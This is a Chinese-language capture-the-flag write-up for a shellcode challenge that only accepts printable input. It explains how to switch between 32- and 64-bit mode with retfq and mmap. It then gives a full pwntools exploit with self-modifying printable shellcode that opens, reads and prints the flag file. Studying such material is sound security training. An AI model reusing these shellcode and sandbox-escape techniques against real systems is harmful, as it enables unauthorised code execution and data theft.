    for ( i = 0; i < v4; ++i )
      {
        if ( *(_BYTE *)(i + 9LL) <= 31 || *(_BYTE *)(i + 9LL) == 127 )
        {
          __asm { syscall; LINUX - sys_write }
          goto LABEL_10;
        }
      }
      MEMORY[9](0LL, 9LL, 4096LL, a4, 0xFFFFFFFFLL, 0LL);
这里对输入进行检测，只能在可见字符范围
所以，我们要用这有限的输入，有限的函数`cat flag`
在这里我们要先知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs =
0x33代表64位模式，而cs寄存器就是通过上面提到的`retfq`汇编指令来修改，具体怎么修改？
retfq有两步操作，`ret以及set
cs`，所以执行retfq会跳转到rsp同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以原先的`rsp
= 0x7ffe530d01b8`会被解析成`esp = 0x530d01b8`
所以在跳转过去后要先平衡好esp的地址，不能直接执行`push ...`
还有就是这个返回地址`0x40404040`怎么来的，这就用到了`mmap`函数了，因为shellcode是写到栈上面的，如果把32位的shellcode在栈上的话，因为64位的栈地址长度比32位的长，所以32位模式下是无法解析出64位的栈地址的，retfq时就会crash掉，所以这里需要先调用mmap申请出一段适合32位的地址来存32位shellcode，`mmap(0x40404040,0x7e,7,34,0,0)`
走到这一步这道题基本完成了，我一开始的想法是直接调用32位下的read,write把flag打印出来，但是发现是bad system
call，无法调用，所以还得回到64位模式下调用，再调用一次retfq
这里需要先把open的返回值保存到别的寄存器，因为在retfq回64位模式的时候会影响到rax
最后就read,write打印出来就OK啦！
整体思路：
    1、用可见字符编写shellcode 调用mmap申请地址，调用read读入32位shellcode
    2、同时构造用retfq切换到32位模式，跳转到32位shellcode 位置
    3、按照32位规则调用fp = open("flag")
    4、保存open函数返回的fp指针，再次调用retfq切换回64模式，跳转到64位shellcode位置
    5、执行read,write打印flag
exp:
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process('./shellcode')
    # p = remote("nc.eonew.cn","10011")
    p.recvuntil("shellcode: ")
    append_x86 = '''
    push ebx
    pop ebx
    '''
    shellcode_x86 = '''
    /*fp = open("flag")*/
    mov esp,0x40404140
    push 0x67616c66
    push esp
    pop ebx
    xor ecx,ecx
    mov eax,5
    int 0x80
    mov ecx,eax
    '''
    shellcode_flag = '''
    push 0x33
    push 0x40404089
    retfq
    /*read(fp,buf,0x70)*/
    mov rdi,rcx
    mov rsi,rsp
    mov rdx,0x70
    xor rax,rax
    syscall
    /*write(1,buf,0x70)*/
    mov rdi,1
    mov rax,1
    syscall
    '''
    shellcode_x86 = asm(shellcode_x86)
    shellcode_flag = asm(shellcode_flag,arch = 'amd64',os = 'linux')
    shellcode = ''
    append = '''
    push rdx
    pop rdx
    '''
    # 0x40404040 为32位shellcode地址
    shellcode_mmap = '''
    /*mmap(0x40404040,0x7e,7,34,0,0)*/
    push 0x40404040 /*set rdi*/
    pop rdi
    push 0x7e /*set rsi*/
    pop rsi
    push 0x40 /*set rdx*/
    pop rax
    xor al,0x47
    push rax
    pop rdx
    push 0x40 /*set r8*/
    pop rax
    xor al,0x40
    push rax
    pop r8
    push rax /*set r9*/
    pop r9
    /*syscall*/
    push rbx
    pop rax
    push 0x5d
    pop rcx
    xor byte ptr[rax+0x31],cl
    push 0x5f
    pop rcx
    xor byte ptr[rax+0x32],cl
    push 0x22 /*set rcx*/
    pop rcx
    push 0x40/*set rax*/
    pop rax
    xor al,0x49
    '''
    shellcode_read = '''
    /*read(0,0x40404040,0x70)*/
    push 0x40404040
    pop rsi
    push 0x40
    pop rax
    xor al,0x40
    push rax
    pop rdi
    xor al,0x40
    push 0x70
    pop rdx
    push rbx
    pop rax
    push 0x5d
    pop rcx
    xor byte ptr[rax+0x57],cl
    push 0x5f
    pop rcx
    xor byte ptr[rax+0x58],cl
    push rdx
    pop rax
    xor al,0x70
    '''
    shellcode_retfq = '''
    push rbx
    pop rax
    xor al,0x40
    push 0x72
    pop rcx
    xor byte ptr[rax+0x40],cl
    push 0x68
    pop rcx
    xor byte ptr[rax+0x40],cl
    push 0x47
    pop rcx
    sub byte ptr[rax+0x41],cl
    push 0x48
    pop rcx
    sub byte ptr[rax+0x41],cl
    push rdi
    push rdi
    push 0x23
    push 0x40404040
    pop rax
    push rax
    '''
    shellcode += shellcode_mmap
    shellcode += append
    shellcode += shellcode_read
    shellcode += append
    shellcode += shellcode_retfq
    shellcode += append
    shellcode = asm(shellcode,arch = 'amd64',os = 'linux')
    print hex(len(shellcode))
    # pause()
    gdb.attach(p,"b *0x40027f\nb*0x4002eb\nc\nc\nsi\n")
    p.sendline(shellcode)
    pause()
    p.sendline(shellcode_x86 + 0x29*'\x90' + shellcode_flag)
    p.interactive()
最后ex师傅牛逼！